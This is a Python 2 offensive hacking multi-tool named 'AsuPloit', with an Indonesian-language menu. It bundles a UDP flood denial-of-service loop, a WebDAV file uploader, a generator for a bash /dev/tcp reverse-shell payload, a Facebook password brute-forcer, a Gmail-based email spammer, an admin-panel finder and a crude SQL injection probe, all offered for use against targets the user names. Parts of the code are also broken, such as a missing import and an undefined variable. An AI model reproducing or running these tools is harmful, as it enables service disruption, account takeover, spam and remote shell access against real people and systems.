# coding: utf8
#!usr/bin/python
#jgn kopas lah bujank
#Do Not Copas
import sys,os,time,mechanize
import random,socket,urllib
import requests,urllib2,cookielib
import itertools,fb
import smtplib,hashlib
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText
from bs4 import BeautifulSoup
def restart():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()
##############################
def cek():
	try: 
		urllib2.urlopen('https://google.co.id', timeout=1) 
	except urllib2.URLError as err: 	
		print "%s[!] %sNo Have Internet Connection"%(G,R)
		main()
##############################
def decryptMD5(hash):
	website = 'http://md5decryption.com/'
	weburl = urllib.urlencode({'hash':hash,'submit':'Decrypt+It!'})
	req = urllib2.Request(website)
	fd = urllib2.urlopen(req, weburl)
	data = fd.read()
	match = re.search(r'(Decrypted Text: </b>)(.+[^>])(</font><br/><center>)', data)
	return match
				# Set Colors ######
N = '\033[0m'
W = '\033[1;37m'
B = '\033[1;34m'
M = '\033[1;35m'
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
C = '\033[1;36m'
I = '\033[1;3m'
LC = '\033[1;96m'
##################
#Settings Global & Variabels
global cmd
global garis
global output
garis="%s------------------------------------------------"%(Y)
line="%s#########################"%(Y)
################################
time.sleep(1)
os.system("clear")
print line
print
print "PENGECUT%s(\_/) "%(G)
print "\t(-.-) BANGSAD"
print "TOLOL\t(> <) "
print "\t%s = = %sWIBU ::Ver 0.60::"%(B,C)
print 
print line
print "%s%sName: %sAsuPloit"%(G,I,C)
print "%sTeam: %sNo Team"%(G,R)
print "%sAuthor: %sHeroBrinePE"%(G,C)
print "%sTips: %sType 'help'"%(G,C)
print line+N+W

def main():
	input=raw_input("%sASP >%s "%(G,W))
	if "os" in input:
		cmd=input.split(" ")
		os.system(cmd[1])
	elif input=="restart":
		restart()
	elif input=="exit":	
		sys.exit
	elif input=="help":
		print "%s[*] %sLainnya:\n%s|\tos <command>\n|\trestart\n|\texit"%(Y,W,M)
		print "%s[*] %sDibawah Adalah Tabel Module Cara Menggunakan Nya Hanyalah Ikuti 'Usage' List"%(Y,W)
		print garis
		print "%sModule\t\tDescription\t\tUsage"%(W)
		print garis
		print "%sDoS\tBasic Denial Of Service Tool\tdos <ip> <port>"%(M)
		print "%sWebdav\tWebdav Injector Tool\t\twebdav <url> <file> <name>"%(M)
		print "%sNCP\tNetcat Payload Maker\t\tncp <ip> <port> <output>"%(M)
		print "%sScrap\tWeb Scraping Tool\t\tscrap <url>"%(M)
		print "%sFBRUTE\tFacebook Brute Tool\t\tfbrute <id> <wordlist>"%(M)
		print "%sWG\tWordlist Generator Tool\t\twg <char> <length> <output>"%(M)
		print "%sGEOIP\tGeoIP Lookup Tool\t\tgeoip <ip>"%(M)
		print "%sESM\tEmail Spammer Tool\t\tesm <email> <pass> <target> <body> <count>"%(M)
		print "%sBIN2PY\tBinary Encryption Tool\t\tbin <string>"%(M) 
		print "%sAPF\tAdmin Panel Finder Tool\t\tapf <url>"%(M)
		print "%sMDB\tMD5 Decryptor Tool\t\tmdb <md5>"%(M)
		print "%sFbP\tPost On Wall FB\t\t\tfbp <msg> <token>"%(M)
		print "%sSQLM\tSql Vuln Injection Scanner\tsqlm <url>"%(M)
		main()
	elif "dos" in input:
		cmd=input.split(" ")
		print "%s[!] %sSTARTING DOS:%s %s:%s"%(G,Y,C,cmd[1],cmd[2])
		bytes = random._urandom(1490)
		client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		print "%s[!] %sCTRL+C For Exit"%(G,Y)
		time.sleep(2)
		kirim=0
		ip=cmd[1]
		port=cmd[2]
		while True:
			try:
				client.sendto(bytes, (ip,int(port)))
				print "%s[!] %sSending:%s %s %sOf Bytes"%(G,Y,R,kirim,Y)
				kirim += 1
			except KeyboardInterrupt:
				print "%s\r[!] %sKeyboard Interrupted By User"%(G,R)
				main()
				break
				#####
	elif "webdav" in input:
		cek()
		cmd=input.split(" ")
		dipes=open(cmd[2]).read()
		r = requests.request("put",cmd[1]+"/"+cmd[3], data=dipes, headers={'Content-Type':'application/octet-stream'})
		if r.status_code < 200 or r.status_code >= 300:
				print "%s[!] %sUpload Failed"%(G,R)
				main()
		else:
				print "%s[!] %sFile Uploaded"%(G,C)
				print "%s[#] %sPath: %s%s"%(G,Y,M,cmd[1]+"/"+cmd[3])
				main()
				#####
	elif "ncp" in input:
		cmd=input.split(" ")
		try:
			pl=open(cmd[3],"w")
			pl.write("bash -i > /dev/tcp/%s/%s 0<&1 2>&1"%(cmd[1],cmd[2]))
			pl.close()
			print "%s[#] %sFILE SAVED: %s%s"%(G,Y,M,cmd[3])
			main()
		except IOError as e:
			print "%s[!] %sISSUES:%s%s"%(G,R,Y,e)
			main()
	####
	elif "scrap" in input:
		cmd=input.split(" ")
		req = requests.get(cmd[1])
		req_data = req.text
		soup = BeautifulSoup(req_data,"html.parser")
		for link in soup.find_all("a"):
			print "%s[*] %sMenemukan => %s%s"%(Y,G,W,link.get("href"))
			
		main()
	###
	elif "fbrute" in input:
		cmd=input.split(" ")
		akmj = "https://m.facebook.com"
		pw=open(cmd[2],"r+")
		to=1
		cj = cookielib.LWPCookieJar()
		for pasw in pw.readlines():
			pasw = pasw.strip("\n")
			print "%s[!]%sAttempt => %i"%(Y,G,to)
			mech=mechanize.Browser()
			mech.set_handle_robots(False)
			mech.set_handle_redirect(True)
			mech.set_handle_referer(True)
			mech.set_handle_equiv(True)
			mech.set_cookiejar(cj)
			mech.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
			mech.addheaders=[('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
			mech.open(akmj)
			mech.select_form(nr=0)
			mech.form["email"]=cmd[1]
			mech.form["pass"]=pasw
			mech.submit()
			text=mech.geturl()
			to += 1
			if "save-device" in text or  "m_sess" in text:
				print "%s[*]%s OK => %s"%(Y,G,pasw)
				main()
				break
			else:
				print "%s[#]%s FAILED => %s"%(Y,R,pasw)
				
		main()
	
	elif "wg" in input:
		cmd=input.split(" ")
		fp=open(cmd[3],"w+")
		for xs in itertools.product(cmd[1],repeat=int(cmd[2])):
			data="".join(xs)
			fp.write("%s\n"%(data))
		fp.close()
		main()
	elif "geoip" in input:
		cmd=input.split(" ")
		respon=urllib2.urlopen("https://api.hackertarget.com/geoip/?q=%s"%(cmd[1])).read()
		spliter=respon.split("\n")
		for bego in spliter:
			print "%s[*]%s%s"%(Y,G,bego)
		main()
		
	elif "esm" in input:
		cmd=input.split(" ")
		msg = MIMEMultipart()
		msg["From"]=cmd[1]
		msg["To"]=cmd[3]
		msg["Subject"]=cmd[4]
		msg.attach(MIMEText(cmd[4], "plain"))
		server = smtplib.SMTP("smtp.gmail.com: 587")
		server.starttls()
		server.login(msg["from"],cmd[2])
		for ajg in range(0,int(cmd[5])):
			server.sendmail(msg['From'], msg['To'], msg.as_string())
			print "%s[!] %sSending =>%s %s"%(Y,G,C,ajg+1)
		server.quit()
		main()
	elif "bin" in input: 
		cmd=input.split(" ")
		data="".join(map(bin,bytearray(cmd[1]))).replace("b","")
		print "%s[!]%s %s"%(Y,G,data)
		main()
	elif "apf" in input:
		cmd=input.split(" ")
		exp=["/admin","/admin/login","/admin/login.php","/admin/panel.php","/wp-login.php","/wp-admin.php","/cpanel","/cpanel/login.php","/admin.php","/administrastor","/administrastor/login.php","/ketua.php","/admin.html","/login.html","/login.php"]
		print "%s[!] %sLoaded...%s%s %sString You Can Modify Exploit String"%(G,Y,R,len(exp),Y)
		for lonte in exp:
			try: 
				urllib2.urlopen(cmd[1]+lonte)
			except urllib2.HTTPError as e: 
				continue
			except urllib2.URLError as e:
				continue
			else:
				print "%s[*]%s %s => OK"%(Y,G,lonte)			
		print "%s[!] %sComplete"%(Y,C)
		main()
	elif "mdb" in input:
		cmd=input.split(" ")
		mulai=decryptMD5(cmd[1])
		if mulai:
			print "%s[!] %s %s"%(Y,G,match.group(2))
			main()
		else:
			print "%s[!] %s Gagal"%(Y,R)
			main()
	elif "fbp" in input:
		cmd=input.split(" ")
		face=fb.graph.api(cmd[2])
		face.publish(cat="feed",id="me",message=cmd[1])
		print "%s[!] %sPublished.."%(Y,G)
		main()
	elif "sqlm" in input:
		cmd=input.split(" ")
		test=urllib2.urlopen(cmd[1]+"'")
		if "You have an error in your SQL syntax" in test.read():
			print "%s[!] %sThis Site Vuln"%(Y,G)
			main()
		else:
			print "%s[!] %sThis Site Not Vuln"%(Y,R)
			main()
	else:
		print "%s[!] %sNo Module Named:%s %s"%(G,R,Y,input)
		main()
if __name__=="__main__":
	main()